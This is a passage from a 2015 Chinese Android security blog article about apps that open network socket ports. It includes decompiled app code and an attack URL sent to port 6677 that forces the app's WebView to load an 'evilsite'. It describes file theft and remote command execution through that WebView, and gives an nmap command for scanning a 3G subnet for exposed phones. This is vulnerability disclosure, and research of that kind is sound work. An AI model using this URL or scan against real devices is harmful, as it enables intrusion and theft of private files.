+<div class="line number4 index3 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">NewMapActivity.</code><code class="java keyword">class</code><code class="java plain">);</code></div>
+<div class="line number5 index4 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">v1.setData(v0_2);</code></div>
+<div class="line number6 index5 alt1"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">v1.setFlags(</code><code class="java value">268435456</code><code class="java plain">);</code></div>
+<div class="line number7 index6 alt2"><code class="java spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="java plain">MovieDetailHeaderView.c(</code><code class="java keyword">this</code><code class="java plain">.a).startActivity(v1);</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<p>表明可以通过远程HTTP GET请求如下地址</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7abe4c951f988147178" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">http://ip:6677/androidamap?action=openFeature&amp;featureName=OpenURL&amp;sourceApplication=banner&amp;urlType=0&amp;contentType=autonavi&amp;url=evilsite</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7abe4c951f988147178-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7abe4c951f988147178-1"><span class="crayon-v">http</span><span class="crayon-o">:</span><span class="crayon-c">//ip:6677/androidamap?action=openFeature&amp;featureName=OpenURL&amp;sourceApplication=banner&amp;urlType=0&amp;contentType=autonavi&amp;url=evilsite</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0007 seconds] -->
+<p>操纵安装该app的手机继承WebView的Activity访问evilsite，而且这里存在WebView的漏洞，利用方式包括</p>
+<p>(1). 窃取私有目录下的敏感文件：远程攻击者或者本地恶意app可以令WebView加载file://域的恶意脚本文件，按照恶意脚本的请求，窃取该应用私有目录下的敏感文件，突破android沙箱限制；</p>
+<p>(2). WebView远程命令执行：存在可被网页中js操纵的接口jsinterface。由于该流行应用针对的SDK版本较低（<code>android:minSdkVersion="8"</code>），在Android 4.4.2以下的手机，均可使用该接口，通过js注入该应用进程执行命令。</p>
+<h1>0x03 漏洞利用场景</h1>
+<hr>
+<p>对于Android app开放socket端口漏洞的远程利用场景，一般认为Android客户端都在内网，其利用主要还是在非安全的公共WiFi环境，通过对漏洞特征扫描即可利用。但在传统认为安全的移动互联网环境，笔者发现仍然可以扫描到其他开放端口的终端，因此也可以利用这种漏洞。</p>
+<p>叙述之前，我们先对典型的移动通信网络架构进行简单的科普，一般教科书上的3G网络架构（WCDMA）如图。</p>
+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353322435.jpg" alt="enter image description here"></p>
+<p>包括以下组成部分：</p>
+<ol>
+<li>UE: 用户终端设备，就是手机，为用户提供电路域和分组域内的各种业务功能。</li>
+<li>UTRAN: 陆地无线接入网，分为基站（Node B）和无线网络控制器（RNC）两部分。</li>
+<li>CN: 核心网络，负责与其他网络的连接和对UE 的通信和管理。主要功能实体包括：
+<p>(1) MSC/VLR：提供CS(电路交换)域的呼叫控制、移动性管理、鉴权和加密等功能；</p>
+<p>(2) GMSC：网关移动交换中心，充当移动网和固定网之间的移动关口局，承担路由分析、网间接续、网间结算等重要功能；</p>
+<p>(3) SGSN：GPRS服务支持节点，提供PS（分组交换）域的路由转发、移动性管理、会话管理、鉴权和加密等功能；</p>
+<p>(4) GGSN：网关GPRS支持节点，提供数据包在WCDMA 移动网和外部数据网之间的路由和封装，GGSN就好象是可寻址WCDMA移动网络中所有用户IP 的路由器，需要同外部网络交换路由信息。</p>
+<p>(5) HLR：归属位置寄存器，提供用户的签约信息存放、新业务支持、增强的鉴权等功能。</p></li>
+<li>External Networks：外部网络，包括ISDN和PSTN等电路交换网络，以及Internet等分组交换网络。</li>
+</ol>
+<p>简而言之，移动通信网络无非是大型的“局域网“，它们通过网关路由器（SGSN和GGSN）连上了Internet，进入到了互联网的世界。但是在某些移动通信网络的内部，不同的UE是可以互访的。以前面某应用开放6677端口为例，我们可以做一个简单的实验进行证明。</p>
+<p>使用联通3G网络，查看当前IP地址。</p>
+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353398307.png" alt="enter image description here"></p>
+<p>在相邻C段进行扫描，扫描到开放端口的手机</p><!-- Crayon Syntax Highlighter v2.7.1 -->
+
+		<div id="crayon-55a7abe4c952e434410771" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style="margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important; height: 18px !important; line-height: 18px !important; margin-top: -18px; display: none; z-index: 4;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码" style="display: none;"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div><span class="crayon-language">Java</span></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly="" style="tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;">nmap -sT --open -p6677 10.160.112.0/24</textarea></div>
+			<div class="crayon-main" style="position: relative; z-index: 1; overflow: hidden;">
+				<table class="crayon-table">
+					<tbody><tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-55a7abe4c952e434410771-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-55a7abe4c952e434410771-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">sT</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">open</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p6677</span><span class="crayon-h"> </span><span class="crayon-cn">10.160.112.0</span><span class="crayon-o">/</span><span class="crayon-cn">24</span></div></div></td>
+					</tr>
+				</tbody></table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0014 seconds] -->
+<p>发现如下结果</p>
+<p><img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/2015070902353476966.png" alt="enter image description here"></p>
+<p>这证明在移动网络中，不同的UE可以互访。因此如果开放上述socket端口的app存在漏洞，在移动网络中也是可以利用的。</p>
+<h1>0x04 小结</h1>
+<hr>
+<p>对于客户端的远程漏洞利用，从攻击者的角度来看，通常更容易使用“受”的方法，即通过欺骗、劫持或社工的方法来让客户端访问我的攻击载荷。然而，从笔者发现的漏洞案例来看，许多Android应用不正确地使用网络socket端口传入命令进行跨进程通信，而且对于本地应用环境，网络socket也先天缺乏细粒度的认证授权机制，因此把Android客户端当做服务器，使用“攻”的方法，主动向开放端口发送攻击载荷也是可行的。这种漏洞一旦存在，轻则本地提权，重则为远程利用的高危漏洞，3G移动网络允许UE互访更是加剧了这种风险。</p>
+<p>此外，除PF_INET外，PF_UNIX、PF_NETLINK域的套接字也是值得关注的本地攻击面。</p>
+<p>参考文献：<code>[1] http://blog.trendmicro.com/trendlabs-security-intelligence/open-socket-poses-risks-to-android-security-model</code></p>
+<p>原文链接：http://drops.wooyun.org/mobile/6973 &nbsp; &nbsp;作者：<a class="author name ng-binding" href="http://drops.wooyun.org/author/%E5%B0%8F%E8%8D%B7%E6%89%8D%E9%9C%B2%E5%B0%96%E5%B0%96%E8%A7%92" target="_blank">小荷才露尖尖角</a></p>
+<p>&nbsp;</p>
+<p class="tags"></p>
+
+<div class="date">
+  <span class="day">09</span>
+  <span class="month">2015-07</span>
+</div>
+</article>
+<p>&nbsp;</p>
+	</div><div class="col-lg-3" id="side"><aside class="uazoh7-widget"><h3 style="margin-top: 0px;">文章分类</h3>		<div class="uazoh7-category-widget"><div class="uazoh7-widget-inner"><ul>
+<li><p><a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/" title="APP漏洞挖掘"><i class="fa fa-folder-open"></i>APP漏洞挖掘</a> <a href="http://www.droidsec.cn/category/app%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98/"><i class="fa fa-rss"></i></a> <span>25</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/androidsecuritybook/" title="安卓安全书籍"><i class="fa fa-folder-open"></i>安卓安全书籍</a> <a href="http://www.droidsec.cn/category/androidsecuritybook/"><i class="fa fa-rss"></i></a> <span>8</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/" title="安卓安全工具"><i class="fa fa-folder-open"></i>安卓安全工具</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e5%ae%89%e5%85%a8%e5%b7%a5%e5%85%b7/"><i class="fa fa-rss"></i></a> <span>11</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/" title="安卓漏洞攻防"><i class="fa fa-folder-open"></i>安卓漏洞攻防</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e6%bc%8f%e6%b4%9e%e6%94%bb%e9%98%b2/"><i class="fa fa-rss"></i></a> <span>16</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e9%80%86%e5%90%91%e5%88%86%e6%9e%90/" title="安卓逆向分析"><i class="fa fa-folder-open"></i>安卓逆向分析</a> <a href="http://www.droidsec.cn/category/%e5%ae%89%e5%8d%93%e9%80%86%e5%90%91%e5%88%86%e6%9e%90/"><i class="fa fa-rss"></i></a> <span>9</span></p><small></small></li><li><p><a href="http://www.droidsec.cn/category/%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8%e8%b5%84%e8%ae%af/" title="移动安全资讯"><i class="fa fa-folder-open"></i>移动安全资讯</a> <a href="http://www.droidsec.cn/category/%e7%a7%bb%e5%8a%a8%e5%ae%89%e5%85%a8%e8%b5%84%e8%ae%af/"><i class="fa fa-rss"></i></a> <span>9</span></p><small></small></li>		</ul></div></div>
+</aside><aside class="uazoh7-widget"><h3>友情链接</h3>
+	<ul class="xoxo blogroll">
+<li><a href="http://security.tencent.com/" target="_blank">腾讯TSRC</a></li>
+<li><a href="http://www.ijiandao.com/" target="_blank">爱尖刀</a></li>
+<li><a href="http://xteam.baidu.com/" target="_blank">Baidu x-team</a></li>
+<li><a href="http://blogs.360.cn/360mobile/" target="_blank">360移动安全</a></li>
+<li><a href="http://navisec.it/" target="_blank">navisec安全导航</a></li>
+<li><a href="http://www.nxadmin.com/">Nxadmin</a></li>
+<li><a href="http://www.secpulse.com/" target="_blank">安全脉博</a></li>
+<li><a href="http://www.monstersb.net/" target="_blank">Monster</a></li>
+<li><a href="http://jaq.alibaba.com/blog.htm" target="_blank">阿里聚安全</a></li>
+<li><a href="http://www.freebuf.com/" target="_blank">FreeBuf</a></li>
+<li><a href="http://www.wooyun.org/" target="_blank">乌云漏洞平台</a></li>
+<li><a href="http://wiki.secmobi.com/home" target="_blank">SecMobi Wiki</a></li>
+<li><a href="http://securityintelligence.com/" target="_blank">SecurityIntelligence</a></li>
+<li><a href="http://androidxref.com/" target="_blank">AndroidXRef</a></li>
+<li><a href="http://www.androiddevtools.cn/" target="_blank">AndroidDevTools</a></li>
+
+	</ul>
+</aside>
+</div></div></div></section>
+<div id="comments" style="display:none"><a name="respond"></a></div>
+<div id="denglu_tuijian"></div><div id="denglu_comment"><iframe name="easyXDM_default7993_provider" id="easyXDM_default7993_provider" frameborder="0" src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/commentMiddle.html" style="width: 100%; height: 232px;"></iframe></div>
+
+</div><!--uazoh7-content-->
+<footer class="uazoh7-footer">
+      <div class="container">
+        <div class="row">
+		<div class="col-lg-2 col-md-2">
+            <div class="uazoh7-widget uazoh7-links-widget">
+              <h3>links</h3>
+              <div class="uazoh7-widget-inner">
+                <ul id="footer_top_nav" class="mobile-menu"><li><a href="http://www.droidsec.cn/">首页</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/android-security-basic/">Android安全基础</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/app%e5%ae%89%e5%85%a8%e6%b5%8b%e8%af%95%e5%85%a5%e9%97%a8/">APP安全测试入门</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e9%87%91%e5%88%9a%e5%ae%a1%e8%ae%a1%e7%b3%bb%e7%bb%9f/">金刚审计系统</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%85%b3%e4%ba%8e%e6%9c%ac%e7%ab%99/">关于DroidSec</a><span class="border"></span></li>
+<li><a href="http://weibo.com/androidsec">关注本站微博</a><span class="border"></span></li>
+</ul>              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-4 col-md-4">
+            <div class="uazoh7-widget uazoh7-links-widget uazoh7-about-widget">
+              <h3>随机 <strong>文章</strong></h3>
+              <div class="uazoh7-widget-inner">
+   <ul>
+<li><a href="http://www.droidsec.cn/%e5%ae%89%e5%8d%93app%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%8a%80%e6%9c%af/" rel="bookmark" title="安卓APP动态调试技术">安卓APP动态调试技术</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/android%e5%ae%89%e5%85%a8%e6%94%bb%e9%98%b2%e6%8c%87%e5%8d%97-%e7%ac%ac2%e7%ab%a0-android%e7%9a%84%e5%ae%89%e5%85%a8%e8%ae%be%e8%ae%a1%e4%b8%8e%e6%9e%b6%e6%9e%84-%ef%bc%883%ef%bc%89/" rel="bookmark" title="《Android安全攻防指南》第2章 Android的安全设计与架构 （3）">《Android安全攻防指南》第2章 Android的安全设计与架构 （3）</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/2015%e5%b9%b4%e9%93%b6%e8%a1%8c%e7%a7%bb%e5%8a%a8%e5%ba%94%e7%94%a8%e5%ae%89%e5%85%a8%e6%80%a7%e8%b0%83%e6%9f%a5%e6%8a%a5%e5%91%8a/" rel="bookmark" title="墨贝科技发布《2015年银行移动应用安全性调查报告》">墨贝科技发布《2015年银行移动应用安全性调查报告》</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/frida-%e8%b7%a8%e5%b9%b3%e5%8f%b0%e6%b3%a8%e5%85%a5%e5%b7%a5%e5%85%b7%e5%9f%ba%e7%a1%80%e7%af%87/" rel="bookmark" title="Frida-跨平台注入工具基础篇">Frida-跨平台注入工具基础篇</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/android-app%e9%80%9a%e7%94%a8%e5%9e%8b%e6%8b%92%e7%bb%9d%e6%9c%8d%e5%8a%a1%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%e6%8a%a5%e5%91%8a/" rel="bookmark" title="Android APP通用型拒绝服务漏洞分析报告">Android APP通用型拒绝服务漏洞分析报告</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%ae%89%e5%8d%93%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e4%b8%83%e7%a7%8d%e6%ad%a6%e5%99%a8%e4%b9%8b%e5%ad%94%e9%9b%80%e7%bf%8e-ida-pro/" rel="bookmark" title="安卓动态调试七种武器之孔雀翎 – Ida Pro">安卓动态调试七种武器之孔雀翎 – Ida Pro</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/%e5%b8%b8%e8%a7%81android-native%e5%b4%a9%e6%ba%83%e5%8f%8a%e9%94%99%e8%af%af%e5%8e%9f%e5%9b%a0/" rel="bookmark" title="常见Android Native崩溃及错误原因">常见Android Native崩溃及错误原因</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/hacking-team-android-browser-exploit%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90/" rel="bookmark" title="Hacking Team Android Browser Exploit代码分析">Hacking Team Android Browser Exploit代码分析</a><span class="border"></span></li>
+<li><a href="http://www.droidsec.cn/webview-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e%e6%b5%85%e6%9e%90/" rel="bookmark" title="WebView 远程代码执行漏洞浅析">WebView 远程代码执行漏洞浅析</a></li>
+</ul>
+            </div>
+          </div></div>
+
+          <div class="col-lg-3 col-md-3">
+            <div class="uazoh7-widget uazoh7-tags-widget">
+              <h3>文章 <strong>Tags</strong></h3>
+              <div class="uazoh7-widget-inner">
+                <a href="http://www.droidsec.cn/tag/pin/" class="tag-link-47" title="1个话题" style="font-size: 13pt;">PIN</a>
+<a href="http://www.droidsec.cn/tag/tsrc/" class="tag-link-48" title="1个话题" style="font-size: 13pt;">TSRC</a>
+<a href="http://www.droidsec.cn/tag/ui/" class="tag-link-42" title="1个话题" style="font-size: 13pt;">UI</a>
+<a href="http://www.droidsec.cn/tag/activity/" class="tag-link-36" title="1个话题" style="font-size: 13pt;">Activity</a>
+<a href="http://www.droidsec.cn/tag/mobile-forensics/" class="tag-link-32" title="1个话题" style="font-size: 13pt;">Mobile Forensics</a>
+<a href="http://www.droidsec.cn/tag/santoku-linux/" class="tag-link-33" title="1个话题" style="font-size: 13pt;">Santoku Linux</a>
+<a href="http://www.droidsec.cn/tag/url/" class="tag-link-49" title="1个话题" style="font-size: 13pt;">URL</a>
+<a href="http://www.droidsec.cn/tag/sd/" class="tag-link-50" title="1个话题" style="font-size: 13pt;">SD</a>
+<a href="http://www.droidsec.cn/tag/debug/" class="tag-link-62" title="1个话题" style="font-size: 13pt;">DEBUG</a>
+<a href="http://www.droidsec.cn/tag/google-android/" class="tag-link-71" title="1个话题" style="font-size: 13pt;">Google Android</a>
+<a href="http://www.droidsec.cn/tag/verbose/" class="tag-link-61" title="1个话题" style="font-size: 13pt;">VERBOSE</a>
+<a href="http://www.droidsec.cn/tag/android-override/" class="tag-link-57" title="1个话题" style="font-size: 13pt;">Android Override</a>
+<a href="http://www.droidsec.cn/tag/http/" class="tag-link-51" title="1个话题" style="font-size: 13pt;">HTTP</a>
+<a href="http://www.droidsec.cn/tag/mitm/" class="tag-link-52" title="1个话题" style="font-size: 13pt;">MITM</a>
+<a href="http://www.droidsec.cn/tag/adb/" class="tag-link-24" title="1个话题" style="font-size: 13pt;">ADB</a>
+<a href="http://www.droidsec.cn/tag/root/" class="tag-link-22" title="1个话题" style="font-size: 13pt;">ROOT</a>
+<a href="http://www.droidsec.cn/tag/android-shared-preferences/" class="tag-link-18" title="1个话题" style="font-size: 13pt;">Android Shared Preferences</a>
+<a href="http://www.droidsec.cn/tag/android-internal-storage/" class="tag-link-19" title="1个话题" style="font-size: 13pt;">Android Internal Storage</a>
+<a href="http://www.droidsec.cn/tag/android-backup/" class="tag-link-21" title="1个话题" style="font-size: 13pt;">Android Backup</a>
+<a href="http://www.droidsec.cn/tag/gui/" class="tag-link-35" title="2个话题" style="font-size: 13pt;">GUI</a>
+<a href="http://www.droidsec.cn/tag/android-system/" class="tag-link-12" title="2个话题" style="font-size: 13pt;">Android System</a>
+<a href="http://www.droidsec.cn/tag/uri/" class="tag-link-46" title="2个话题" style="font-size: 13pt;">URI</a>
+<a href="http://www.droidsec.cn/tag/uc/" class="tag-link-53" title="2个话题" style="font-size: 13pt;">UC</a>
+<a href="http://www.droidsec.cn/tag/gid/" class="tag-link-89" title="2个话题" style="font-size: 13pt;">GID</a>
+<a href="http://www.droidsec.cn/tag/uxss/" class="tag-link-74" title="2个话题" style="font-size: 13pt;">UXSS</a>
+<a href="http://www.droidsec.cn/tag/apk/" class="tag-link-15" title="3个话题" style="font-size: 13pt;">APK</a>
+<a href="http://www.droidsec.cn/tag/jeb/" class="tag-link-44" title="3个话题" style="font-size: 13pt;">JEB</a>
+<a href="http://www.droidsec.cn/tag/drozer/" class="tag-link-76" title="3个话题" style="font-size: 13pt;">Drozer</a>
+<a href="http://www.droidsec.cn/tag/api/" class="tag-link-59" title="3个话题" style="font-size: 13pt;">API</a>
+<a href="http://www.droidsec.cn/tag/poc/" class="tag-link-16" title="4个话题" style="font-size: 13pt;">POC</a>              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-3 col-md-3">
+            <div class="uazoh7-widget uazoh7-about-widget">
+              <h3>关注 | 联系</h3>
+              <div class="uazoh7-widget-inner">                  <img src="浅谈Android开放网络端口的安全风险 _ DroidSec.cn_files/3d563857728b88c4f666a9d9adb4c2ed_qrcode.png" alt="DroidSec.cn qr-code">				  <p class="contacts" style="border-top-width: 1px; margin-top: 30px;"><i class="fa fa-envelope"></i> DroidSec#QQ.com</p>              </div>
+            </div>
+          </div>
+
+          <div class="col-lg-12">
+            <div class="uazoh7-widget uazoh7-copyright-widget">
+              <div class="uazoh7-widget-inner">
+                <p>© Copyright 2015 by DroidSec.cn. All Rights Reserved.</p>
+                <p><a href="http://weibo.com/androidsec">更多安卓安全资讯请关注本站微博</a> </p>
+              </div>
+            </div>
+          </div>        </div>
+      </div>
+</footer>
+
+
+
+
+
+
+
+
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div><button type="button" id="cboxClose"></button></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div></div>
+
+ </body></html>
